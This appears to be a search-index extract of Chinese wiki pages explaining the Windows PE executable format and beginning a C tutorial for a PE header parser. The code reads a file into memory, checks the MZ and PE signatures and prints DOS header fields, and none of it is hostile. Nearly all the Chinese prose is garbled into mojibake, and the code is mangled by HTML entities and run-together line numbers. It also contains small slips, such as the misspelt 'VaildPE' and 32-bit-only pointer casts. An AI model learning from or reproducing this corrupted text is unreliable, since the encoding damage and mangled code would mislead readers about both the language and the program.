¹æ®e_lfanewå­—æ®µï¼ˆä»æ–‡ä»¶å¤´å¼€å§‹åç§»0x3Chå­—èŠ‚çš„ä½ç½®ï¼‰çš„å€¼æ‰¾åˆ°PEå¤´èµ·å§‹ä½ç½®ã€‚PEå¤´åç§»ä½ç½®ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯Signatureï¼Œè¯¥å­—æ®µçš„å€¼åº”ä¸º0x00004550ï¼Œå…¶å¯¹åº”çš„ASCIIå­—ç¬¦æ˜¯&quot;PE\\0\\0&quot;ï¼ˆ&quot;PE&quot;åè·Ÿä¸¤ä¸ªç©ºå­—ç¬¦ï¼‰ã€‚ .exe.dll.sys.ocx.com.pdf.zip Structure Overview PEæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼Œä»æ–‡ä»¶å¤´åˆ°æ–‡ä»¶å°¾ä¾æ¬¡æ˜¯ï¼šDOSéƒ¨åˆ†ã€PEæ–‡ä»¶å¤´ã€èŠ‚è¡¨ã€èŠ‚æ•°æ®ã€‚ Sectionï¼Œåˆç§°åŒºæ®µï¼ŒèŠ‚ï¼ŒèŠ‚åŒºï¼ŒåŒºå—ï¼Œå—ï¼Œåæ–‡ä¸ä½œåŒºåˆ†ã€‚ ä¸€çº§ç±»åˆ« æˆå‘˜ å­—æ®µ å¤§å° å¯¹é½è¦æ±‚ èŒƒå›´ DOSå¤´ DOS MZå¤´ï¼Œåˆç§°MZå¤´éƒ¨ IMAGE_DOS_HEADER 64å­—èŠ‚ ï¼ˆDOSå¤´+PEå¤´+èŠ‚è¡¨ï¼‰çš„å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ èµ·å§‹ï¼šä»æ–‡ä»¶å¤´å¼€å§‹æœ«å°¾ï¼šèµ·å§‹+0x40h DOS Stubï¼Œåˆç§°DOSå­˜æ ¹ï¼Œåˆç§°DOSæ®‹ç•™ ä¸€å †æ•°æ® æ— å›ºå®šé•¿åº¦ MZå¤´å’ŒPEå¤´ä¹‹é—´ PEå¤´ï¼ˆIMAGE_FILE_HEADERï¼‰ PEæ ‡è¯†ï¼ŒPEæ–‡ä»¶å¤´æ ‡è¯† Signature 4å­—èŠ‚ èµ·å§‹ï¼šç”±e_lfanewæ‰¾åˆ°èµ·å§‹ä½ç½®æœ«å°¾ï¼š4å­—èŠ‚ æ ‡å‡†PEå¤´ï¼Œåˆç§°æ–‡ä»¶å¤´ IMAGE_FILE_HEADER 20å­—èŠ‚ èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚æœ«å°¾ï¼šèµ·å§‹+20å­—èŠ‚ æ‰©å±•PEå¤´ï¼Œåˆç§°å¯é€‰å¤´ IMAGE_OPTIONAL_HEADER32IMAGE_OPTIONAL_HEADER64 224å­—èŠ‚ï¼ŒE0h240å­—èŠ‚ï¼ŒF0hå¤§å°å¯å˜ èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚+20å­—èŠ‚æœ«å°¾ï¼šèµ·å§‹+SizeOfOptionalHeader èŠ‚è¡¨ï¼ˆç»“æ„ä½“æ•°ç»„ï¼‰ èŠ‚è¡¨ä¸€ IMAGE_SECTION_HEADER 40å­—èŠ‚ èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚+20å­—èŠ‚+SizeOfOptionalHeaderæœ«å°¾ï¼šèµ·å§‹+40å­—èŠ‚ èŠ‚è¡¨äºŒ IMAGE_SECTION_HEADER 40å­—èŠ‚ ... ... 40å­—èŠ‚ ï¼ˆSectionçš„ä¸ªæ•°ç”±æ ‡å‡†PEå¤´çš„NumberOfSectionså¾—çŸ¥ï¼‰ èŠ‚è¡¨n IMAGE_SECTION_HEADER 40å­—èŠ‚ èŠ‚è¡¨æ•°æ® èŠ‚è¡¨ä¸€çš„æ•°æ® ä¸€å †æ•°æ® æ— å›ºå®šé•¿åº¦ å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ èµ·å§‹ï¼šèŠ‚è¡¨ä¸€ä¸­çš„PointToRawData èŠ‚è¡¨äºŒçš„æ•°æ® ä¸€å †æ•°æ® æ— å›ºå®šé•¿åº¦ å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ ... ä¸€å †æ•°æ® æ— å›ºå®šé•¿åº¦ å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ èŠ‚è¡¨nçš„æ•°æ® ä¸€å †æ•°æ® æ— å›ºå®šé•¿åº¦ å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ åŸå§‹è¡¨æ ¼ä¸€çº§ç±»åˆ«æˆå‘˜å­—æ®µå¤§å°å¯¹é½è¦æ±‚èŒƒå›´DOSå¤´DOS MZå¤´ï¼Œåˆç§°MZå¤´éƒ¨IMAGE_DOS_HEADER64å­—èŠ‚èµ·å§‹ï¼šä»æ–‡ä»¶å¤´å¼€å§‹æœ«å°¾ï¼šèµ·å§‹+0x40hDOS Stubï¼Œåˆç§°DOSå­˜æ ¹ï¼Œåˆç§°DOSæ®‹ç•™ä¸€å †æ•°æ®æ— å›ºå®šé•¿åº¦MZå¤´å’ŒPEå¤´ä¹‹é—´PEå¤´ï¼ˆIMAGE_FILE_HEADERï¼‰PEæ ‡è¯†ï¼ŒPEæ–‡ä»¶å¤´æ ‡è¯†Signature4å­—èŠ‚èµ·å§‹ï¼šç”±e_lfanewæ‰¾åˆ°èµ·å§‹ä½ç½®æœ«å°¾ï¼š4å­—èŠ‚æ ‡å‡†PEå¤´ï¼Œåˆç§°æ–‡ä»¶å¤´IMAGE_FILE_HEADER20å­—èŠ‚èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚æœ«å°¾ï¼šèµ·å§‹+20å­—èŠ‚æ‰©å±•PEå¤´ï¼Œåˆç§°å¯é€‰å¤´IMAGE_OPTIONAL_HEADER32IMAGE_OPTIONAL_HEADER64224å­—èŠ‚,E0h240å­—èŠ‚ï¼ŒF0hå¤§å°å¯ä¿®æ”¹èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚+20å­—èŠ‚æœ«å°¾ï¼šèµ·å§‹+SizeOfOptionalHeaderèŠ‚è¡¨ï¼ˆç»“æ„ä½“æ•°ç»„ï¼‰èŠ‚è¡¨ä¸€IMAGE_SECTION_HEADER40å­—èŠ‚èµ·å§‹ï¼šPEå¤´+4å­—èŠ‚+20å­—èŠ‚+SizeOfOptionalHeaderæœ«å°¾ï¼šèµ·å§‹+40å­—èŠ‚èŠ‚è¡¨äºŒIMAGE_SECTION_HEADER40å­—èŠ‚â€¦â€¦40å­—èŠ‚ï¼ˆSectionçš„ä¸ªæ•°ç”±æ ‡å‡†PEå¤´çš„NumberOfSectionså¾—çŸ¥ï¼‰èŠ‚è¡¨nIMAGE_SECTION_HEADER40å­—èŠ‚ï¼ˆDOSå¤´+PEå¤´+èŠ‚è¡¨ï¼‰çš„å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€èŠ‚è¡¨æ•°æ®èŠ‚è¡¨ä¸€çš„æ•°æ®ä¸€å †æ•°æ®æ— å›ºå®šé•¿åº¦å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€èµ·å§‹ï¼šèŠ‚è¡¨ä¸€ä¸­çš„PointToRawDataèŠ‚è¡¨äºŒçš„æ•°æ®ä¸€å †æ•°æ®æ— å›ºå®šé•¿åº¦å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€â€¦ä¸€å †æ•°æ®æ— å›ºå®šé•¿åº¦å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€èŠ‚è¡¨nçš„æ•°æ®ä¸€å †æ•°æ®æ— å›ºå®šé•¿åº¦å¤§å°æ˜¯FileAlignmentçš„æ•´æ•°å€ DOSéƒ¨åˆ† DOSå¤´ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šDOS MZæ–‡ä»¶å¤´(IMAGE_DOS_HEADERç»“æ„)å’ŒDOS Stubã€‚ DOS MZæ–‡ä»¶å¤´å¤§å°64ä¸ªå­—èŠ‚ï¼Œåªéœ€å…³æ³¨ä¸¤ä¸ªå­—æ®µï¼š e_magicï¼šPEæ ‡è¯†ï¼Œ4D 5Aã€‚ e_lfanewï¼šDOS MZæ–‡ä»¶å¤´çš„æœ€åä¸€ä¸ªæˆå‘˜ï¼Œå¤§å°4å­—èŠ‚ï¼ŒæŒ‡å‘PEå¤´ï¼ˆIMAGE_NT_HEADERS32ï¼‰çš„èµ·å§‹ä½ç½®ã€‚ DOS Stubå¤§å°ä¸å®šï¼Œæ˜¯å¤¹åœ¨DOS MZæ–‡ä»¶å¤´å’ŒPEæ–‡ä»¶å¤´ä¹‹é—´çš„æ•°æ®ã€‚è¿™å—æ˜¯ç»™é“¾æ¥å™¨ç”¨çš„ï¼Œé“¾æ¥å™¨ä¼šå¾€è¿™é‡Œæ’å…¥æ•°æ®ï¼Œå¯ä»¥äººä¸ºä¿®æ”¹æˆ–åˆ é™¤ï¼Œä¸å½±å“ç¨‹åºè¿è¡Œã€‚ ç¼–è¾‘å™¨ä¸€è¡Œ16ä¸ªå­—èŠ‚ï¼Œ4è¡Œå°±æ˜¯64å­—èŠ‚ã€‚ PEæ–‡ä»¶å¤´ PEæ–‡ä»¶å¤´æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ˆIMAGE_NT_HEADERSï¼‰ï¼Œè¯¥ç»“æ„ä½“æœ‰ä¸‰ä¸ªæˆå‘˜ï¼šPEæ–‡ä»¶å¤´æ ‡å¿—ã€æ ‡å‡†PEå¤´ã€æ‰©å±•PEå¤´ã€‚ PEæ–‡ä»¶å¤´æ ‡å¿—ï¼Œ4å­—èŠ‚ï¼Œæ˜¯PEæ ‡è¯†ã€‚åœ¨ä¸€ä¸ªæœ‰æ•ˆçš„PEæ–‡ä»¶é‡Œï¼ŒSignatureå­—æ®µæ˜¯0x00004550ï¼ŒASCIIå­—ç¬¦æ˜¯â€œPE00â€ã€‚ æ ‡å‡†PEå¤´ä¸­çš„é‡è¦å­—æ®µæœ‰ï¼š NumberOfSectionsï¼šå½“å‰PEæ–‡ä»¶å«æœ‰å‡ ä¸ªSectionã€‚ SizeOfOptionalHeaderï¼šæŒ‡å‡ºæ‹“å±•PEå¤´çš„å¤§å°ã€‚æœªåšä¿®æ”¹çš„é»˜è®¤æƒ…å†µä¸‹ï¼Œ32ä½å’Œ64ä½PEæ–‡ä»¶æ‰©å±•PEå¤´çš„å¤§å°å¦‚ä¸‹ï¼š æ–‡ä»¶ä½æ•° åå…­è¿›åˆ¶ åè¿›åˆ¶ PE32 E0h 224å­—èŠ‚ PE32+ï¼ˆPE64ï¼‰ F0h 240å­—èŠ‚ å¾€æ‰©å±•PEå¤´ä¸­åŠ ç§è´§çš„è¯éœ€è¦ä¿®æ”¹è¿™ä¸ªå­—æ®µã€‚ Characteristicsï¼šæ–‡ä»¶å±æ€§ã€‚ä½æ©ç ï¼Œè¡¨æ˜è¯¥PEæ–‡ä»¶çš„æ–‡ä»¶å±æ€§ã€‚ æ‰©å±•PEå¤´ã€‚PE32+å’ŒPE32çš„å·®å¼‚å¾ˆå°ï¼ŒPE32+ç›¸æ¯”äºPE32å°‘å»äº†ä¸€ä¸ªDWORDé•¿åº¦çš„BaseOfDataæˆå‘˜ï¼ŒImageBaseã€SizeOfStackReserveã€SizeOfStackCommitã€SizeOfHeapReserveã€SizeOfHeapCommitæˆå‘˜ç”±DWORDæ‰©å®½åˆ°äº†ULONGLONGã€‚ æ‰©å±•PEå¤´ä¹‹æ‰€ä»¥æ¯”è¾ƒå¤§ï¼Œå› ä¸ºæœ€åä¸€ä¸ªæˆå‘˜æ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“å¤§å°æ˜¯16ä¸ªå­—èŠ‚ã€‚ æ‰©å±•PEå¤´ä¸­çš„é‡è¦å­—æ®µæœ‰ï¼š Magicï¼šæ ‡è¯†å½“å‰æ–‡ä»¶æ—¶PE32è¿˜æ˜¯PE32+ã€‚ PEçš„ä½æ•° å€¼ PE32 010Bh PE32+ 020Bh AddressOfEntryPointï¼šç¨‹åºæ‰§è¡Œå…¥å£RVAï¼ŒæŒ‡PEæ–‡ä»¶åœ¨å†…å­˜æ‹‰ä¼¸å±•å¼€åï¼Œç¨‹åºä»å“ªä¸ªåœ°å€å¼€å§‹æ‰§è¡Œã€‚è¿™ä¸ªå€¼æ˜¯ç›¸å¯¹äºImageBaseçš„åç§»ã€‚ ImageBaseï¼šå†…å­˜é•œåƒåŸºå€ã€‚æŒ‡PEæ–‡ä»¶åœ¨å†…å­˜ä¸­é¦–é€‰åœ¨å“ªä¸ªåœ°å€å¼€å§‹è½½å…¥æ‹‰ä¼¸ã€‚ SectionAlignmentï¼šPEæ–‡ä»¶åœ¨å†…å­˜æ—¶çš„åŒºå—å¯¹é½å€¼ã€‚ FileAlignmentï¼šPEæ–‡ä»¶åœ¨ç£ç›˜ä¸Šæ—¶çš„åŒºå—å¯¹é½å€¼ã€‚ SizeOfImageï¼šå†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶æ˜ å°„çš„å¤§å°ï¼Œâ‰¥å®é™…ç”¨çš„å€¼æ‰èƒ½è¿è¡Œ SizeOfHeadersï¼šDOSå¤´+PEæ–‡ä»¶å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å°ã€‚ CheckSumï¼šPEæ–‡ä»¶çš„æ£€éªŒå’Œã€‚ DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]ï¼šæ•°æ®ç›®å½•è¡¨ï¼Œæ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ã€‚ä¸åŒçš„æˆå‘˜æ˜¯ä¸åŒçš„è¡¨ã€‚ 0E0hï¼Œ224ä¸ªå­—èŠ‚ï¼Œ224/16=14è¡Œ èŠ‚è¡¨ æ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæˆå‘˜æ˜¯IMAGE_SECTION_HEADERç»“æ„ä½“ï¼Œç»“æ„ä½“å¤§å°æ˜¯40ä¸ªå­—èŠ‚ï¼Œå®ƒåŒ…å«äº†å®ƒæ‰€å…³è”çš„åŒºå—çš„ä¿¡æ¯ã€‚é‡è¦å­—æ®µæœ‰ï¼š Miscï¼šè¡¨ç¤ºåŒºå—çš„å®é™…å¤§å°ï¼ˆæœªå¯¹é½ï¼‰ã€‚ VirtualAddressï¼šè¯¥åŒºå—è½½å…¥å†…å­˜åçš„RVAã€‚ SizeOfRawDataï¼šè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ã€‚ PointerToRawDataï¼šè¯¥å—åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„åç§»ã€‚ Characteristicsï¼šå—å±æ€§ã€‚ä½æ©ç ï¼ŒæŒ‡å‡ºå—å±æ€§ï¼ˆä¾‹å¦‚ä»£ç /æ•°æ®ã€å¯è¯»/å¯å†™ç­‰)ã€‚ ä¸Šå›¾ä¸­ï¼Œä¸åŒé¢œè‰²è¡¨ç¤ºä¸åŒçš„èŠ‚è¡¨ã€‚è¿™ä¸ªä¾‹å­ä¸­æœ‰6ä¸ªèŠ‚è¡¨ã€‚ åœ¨èŠ‚è¡¨åè¾¹æ˜¯ä¸ºäº†å¯¹é½æ–‡ä»¶åç§»è€Œå¡«å……çš„paddingï¼Œè¿™é‡Œå¯èƒ½æœ‰ç¼–è¯‘å™¨æ’å…¥çš„æ•°æ®ï¼Œä¸èƒ½éšä¾¿æ”¹ï¼Œè¦ä¸exeåŠ è½½è¿è¡Œæ—¶ä¼šæœ‰é—®é¢˜ï¼Œè™½ç„¶è¿™é‡Œçš„æ•°æ®ä¸PEæ–‡ä»¶æ ¼å¼æ— å…³ã€‚ èŠ‚æ•°æ® å­˜æ”¾PEæ–‡ä»¶ä¸­actual contentsçš„åœ°æ–¹ï¼ŒåŒ…æ‹¬æ•°æ®ã€èµ„æºã€ä»£ç ç­‰ã€‚ Tools-&gt;Open RAM winnt.hå¸¦åç§»ç‰ˆ"},{"title":"PEè§£æå™¨","path":"/wiki/PE/PEè§£æå™¨.html","content":"éœ€æ±‚ è¾“å‡ºä¸€ä¸ªPEæ–‡ä»¶çš„å„ä¸ªå­—æ®µ æ€»ä½“è®¾è®¡ æ‰“å¼€PEæ–‡ä»¶åˆ›å»ºå†…å­˜æ–‡ä»¶æ˜ åƒ åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ æŒ‰PEç»“æ„ä¸€æ­¥ä¸€æ­¥è§£æ DOSå¤´ PEå¤´ï¼ˆSignaturã€æ ‡å‡†PEå¤´ã€æ‰©å±•PEå¤´ èŠ‚è¡¨ æ³¨æ„çš„ç‚¹ è¿™éƒ¨åˆ†æ˜¯ç¼–ç¨‹å®ç°æ—¶é‡åˆ°çš„ï¼Œè¿™é‡Œç»Ÿä¸€æä¸€ä¸‹ printfæ ¼å¼åŒ–è¾“å‡ºï¼š%Xï¼Œä»¥å¤§å†™çš„åå…­è¿›åˆ¶è¾“å‡ºï¼›%04Xï¼Œè‡³å°‘è¾“å‡º4ä½çš„å¤§å†™åå…­è¿›åˆ¶æ•°ï¼Œä¸è¶³åˆ™è¡¥0 ä¸ºæ–‡ä»¶åˆ›å»ºäº†FileBufferï¼ŒFileBufferèµ·å§‹åœ°å€æ˜¯è‡ªå·±mallocæ¥çš„ä¸€ä¸ªåœ°å€ï¼Œæ ¹æ®e_lfanewæ‰¾PEå¤´æ—¶ï¼Œè¦åŠ ä¸Šè¿™ä¸ªFileBufferçš„èµ·å§‹åœ°å€ PEå¤´èµ·å§‹åœ°å€=FileBufferèµ·å§‹åœ°å€+e_lfanew æ ‡å‡†PEå¤´èµ·å§‹åœ°å€=FileBufferèµ·å§‹åœ°å€+e_lfanew+4å­—èŠ‚ï¼ˆè¶Šè¿‡Signatureï¼‰ æ‰©å±•PEå¤´èµ·å§‹åœ°å€=FileBufferèµ·å§‹åœ°å€+e_lfanew+4å­—èŠ‚ï¼ˆè¶Šè¿‡Signatureï¼‰+æ ‡å‡†PEå¤´çš„å¤§å° èŠ‚è¡¨èµ·å§‹åœ°å€=FileBufferèµ·å§‹åœ°å€+e_lfanew+4å­—èŠ‚ï¼ˆè¶Šè¿‡Signatureï¼‰+æ ‡å‡†PEå¤´çš„å¤§å°+æ ‡å‡†PEå¤´.SizeOfOptionalHeader æ‰“å°èŠ‚æ•°æ®çš„Nameå­—æ®µï¼ŒNameå¯èƒ½æ²¡æœ‰ç»“æŸç¬¦ ç¼–ç¨‹å®ç° æ‰“å¼€PEæ–‡ä»¶åˆ›å»ºå†…å­˜æ–‡ä»¶æ˜ åƒ ä¸ºæ–‡ä»¶åˆ›å»ºå†…å­˜æ–‡ä»¶æ˜ åƒæ˜¯ä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œæ“ä½œæ–‡ä»¶å°±åƒæ“ä½œå†…å­˜å˜é‡æˆ–å†…å­˜æ•°æ®ä¸€æ ·æ–¹ä¾¿ã€‚è¦ä¸æ¯æ¬¡éƒ½è¦è°ƒæ•´æ–‡ä»¶æŒ‡é’ˆä½ç½®ï¼Œæ“ä½œå°±å¾ˆç¹çã€‚ å‡½æ•°å£°æ˜å‡½æ•°å®ç°123456789101112#pragma once#include &lt;stdlib.h&gt; //size_t/* å‡½æ•°åŠŸèƒ½ï¼šå°†ä¸€ä¸ªæ–‡ä»¶è¯»å–åˆ°mallocåˆ†é…çš„å†…å­˜ä¸­ï¼Œè¿”å›åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€ inputå‚æ•°ï¼š filepathï¼šæ–‡ä»¶è·¯å¾„ outputå‚æ•°ï¼š lengthï¼šè¿”å›æ–‡ä»¶é•¿åº¦ è¿”å›å€¼ï¼šè¯¥æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#pragma warning(disable:4996) //disable warning of unsafe function fopenvoid* ReadFileToFileBuffer(const char* filepath, size_t* length)&#123; FILE* pFile; void* buffer; // æ¥mallocè¿”å›å€¼ size_t file_size; // æ¥æ–‡ä»¶å¤§å° // æ‰“å¼€æ–‡ä»¶ pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // å®šä½åˆ°æ–‡ä»¶æœ«å°¾ if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹ if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // åˆ†é…å†…å­˜ buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // freadæ˜¯ä»å½“å‰æ–‡ä»¶æŒ‡é’ˆå¼€å§‹è¯»å– // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // å…³é—­æ–‡ä»¶ fclose(pFile); // å¦‚æœéœ€è¦ï¼Œè¿”å›æ–‡ä»¶å¤§å° if (length != NULL) &#123; *length = file_size; &#125; // è¿”å›å†…å­˜ç¼“å†²åŒºçš„æŒ‡é’ˆ return buffer;&#125; åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ å…ˆåˆ¤æ–­e_magicå­—æ®µï¼Œç„¶ååˆ¤æ–­PEå¤´çš„Signatureå­—æ®µã€‚ä¸¤ä¸ªéƒ½ç¬¦åˆï¼Œå°±æ˜¯æœ‰æ•ˆçš„PEæ–‡ä»¶ã€‚ âš ï¸ï¼šæ ¹æ®e_lfanewæ‰¾PEå¤´æ—¶ï¼Œè¦åŠ ä¸Šå†…å­˜æ–‡ä»¶æ˜ åƒçš„åœ°å€ã€‚ é”™è¯¯çš„å†™æ³•1PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)pDosHeader-&gt;e_lfanew; æ­£ç¡®çš„å†™æ³•1PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); pBufferæ˜¯const void*ç±»å‹ï¼Œå­˜çš„æ˜¯å†…å­˜åœ°å€ã€‚åœ°å€ä¸€ä¸ªæ•°ï¼Œè½¬æˆDWORDï¼Œå’Œe_lfanewç›¸åŠ ï¼Œå¾—åˆ°PEå¤´çš„åœ°å€ï¼Œå°†è¿™ä¸ªæ•°å¼ºè½¬ä¸ºPIMAGE_NT_HEADERS32æŒ‡é’ˆç±»å‹ã€‚ å¦‚æœä¸è½¬æˆDWORDç±»å‹ï¼Œå°±æ˜¯æŒ‡é’ˆç±»å‹åŠ æ•´æ•°çš„æƒ…å†µï¼šæŒ‡é’ˆç±»å‹+N=ï¼Œå°±å˜æˆå¸¦*ç±»å‹å˜é‡ + N*(å»æ‰ä¸€ä¸ª*åç±»å‹çš„å®½åº¦)ï¼Œè¿™ä¼šå’Œæˆ‘ä»¬çš„é¢„æœŸä¸ç¬¦ï¼ˆæˆ‘ä»¬é¢„æœŸæ˜¯åœ¨è¿™ä¸ªåœ°å€çš„åŸºç¡€ä¸ŠåŠ ä¸ŠpDosHeader-&gt;e_lfanewè¿™ä¸ªå€¼è€Œå·²ï¼‰ å‡½æ•°å£°æ˜å‡½æ•°å®ç°12345678#pragma once#include &lt;Windows.h&gt;/* å‡½æ•°åŠŸèƒ½ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ å‚æ•°ï¼šå†…å­˜åœ°å€ è¿”å›å€¼ï¼šBOOLç±»å‹*/BOOL VaildPE(const void* pBuffer);123456789101112131415161718192021222324#include &quot;VaildPE.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL VaildPE(const void* pBuffer)&#123; //åˆ¤æ–­MZæ ‡å¿— PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; if (IMAGE_DOS_SIGNATURE != pDosHeader-&gt;e_magic) &#123; printf(&quot;It&#x27;s not a vaild MZ Signature &quot;); return FALSE; &#125; //åˆ¤æ–­PEæ ‡è®° PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); if (IMAGE_NT_SIGNATURE != pImageNTHeaders32-&gt;Signature) &#123; printf(&quot;It&#x27;s not a vaild PE Signature &quot;); return FALSE; &#125; return TRUE;&#125; æŒ‰PEç»“æ„ä¸€æ­¥ä¸€æ­¥è§£æ DOSå¤´ å‡½æ•°æ¥æ”¶æ–‡ä»¶å†…å­˜æ˜ åƒåŸºå€ï¼Œç„¶åæŒ‰å­—æ®µé€ä¸ªè¾“å‡º å‡½æ•°å£°æ˜å‡½æ•°å®ç°12345678910#pragma once/* å‡½æ•°åŠŸèƒ½ï¼šæ‰“å°ä¸€ä¸ªPEæ–‡ä»¶çš„DOS MZå¤´ inputå‚æ•°ï¼š pBufferï¼šæ–‡ä»¶å†…å­˜æ˜ åƒåŸºå€ è¿”å›å€¼ï¼šæ— */void PrintDosHeader(const void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;PrintDosHeader.h&quot;#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;void PrintDosHeader(const void* pBuffer)&#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; printf(&quot;IMAGE_DOS_HEADER-&gt; &quot;); printf(&quot; e_magic: 0x%04X &quot;, pDosHeader-&gt;e_magic); printf(&quot; e_cblp: 0x%04X &quot;, pDosHeader-&gt;e_cblp); printf(&quot; e_cp: 0x%04X &quot;, pDosHeader-&gt;e_cp); printf(&quot; e_crlc: 0x%04X &quot;, pDosHeader-&gt;e_crlc); printf(&quot; e_cparhdr: 0x%04X &quot;, pDosHeader-&gt;e_cparhdr); printf(&quot; e_minalloc: 0x%04X &quot;, pDosHeader-&gt;e_minalloc); printf(&quot; e_maxalloc: 0x%04X &quot;, pDosHeader-&gt;e_maxalloc); printf(&quot; e_ss: 0x%04X &quot;, pDosHeader-&gt;e_ss); printf(&quot; e_sp: 0x%04X &quot;, pDosHeader-&gt;e_sp); printf(&quot; e_csum: 0x%04X &quot;, pDosHeader-&gt;e_csum); printf(&quot; e_ip: 0x%04X &quot;, pDosHeader-&gt;e_ip); printf(&quot; e_cs: 0x%04X &quot;, pDosHeader-&gt;e_cs); printf(&quot; e_lfarlc: 0x%04X &quot;, pDosHeader-&gt;e_lfarlc); printf(&quot; e_ovno: 0x%04X &quot;, pDosHeader-&gt;e_ovno); printf(&quot; e_res[4]: &quot;); int i; for (i = 0; i &lt; 4; i++) &#123; printf(&quot;%04X &quot;, pDosHeader-&gt;e_res[i]); &#125; printf(&quot; &quot;); printf(&quot; e_oemid: 0x%04X &quot;, pDosHeader-&gt;e_oemid); printf(&quot; e_oeminfo: 0x%04X &quot;, pDosHeader-&gt;e_oeminfo); printf(&quot; e_res2[10]: &quot;); for (i = 0; i &lt; 10; i++) &#123; printf(&quot;%04X &quot;, pDosHeader-&gt;e_res2[i]); &#125; printf(&quot; &quot;); printf(&quot; e_lfanew: 0x%08X &quot;, pDosHeader-&gt;e_lfanew);&#125; PEå¤´ PEæ ‡è¯† ç”¨å†…å­˜æ–‡ä»¶æ˜ åƒåŸºå€ or DOSå¤´åŸºå€+e_lfanewå¾—åˆ°PEå¤´çš„èµ·å§‹åœ°å€ï¼Œç„¶åæ‰“å°PEæ ‡è¯† 123456//DOSå¤´åœ°å€+e_lfanewPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);//pbufferåŸºå€+e_lfanewPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pBuffer + pDosHeader-&gt;e_lfanew); 123//PEæ ‡è¯†printf(&quot;IMAGE_NT_HEADERS32-&gt; &quot;);printf(&quot; Signature: 0x%08X &quot;, pImageNTHeaders32-&gt;Signature); æ ‡å‡†PEå¤´ PEä¸­çš„æ ‡å‡†PEå¤´æ˜¯ä¸ªç»“æ„ä½“IMAGE_FILE_HEADERã€‚æ€ä¹ˆæ‰“å°IMAGE_FILE_HEADERé‡Œçš„å„ä¸ªå­—æ®µï¼Ÿ 123456typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PEæ ‡è¯† IMAGE_FILE_HEADER FileHeader; // æ ‡å‡†PEå¤´ IMAGE_OPTIONAL_HEADER32 OptionalHeader; // æ‰©å±•PEå¤´&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 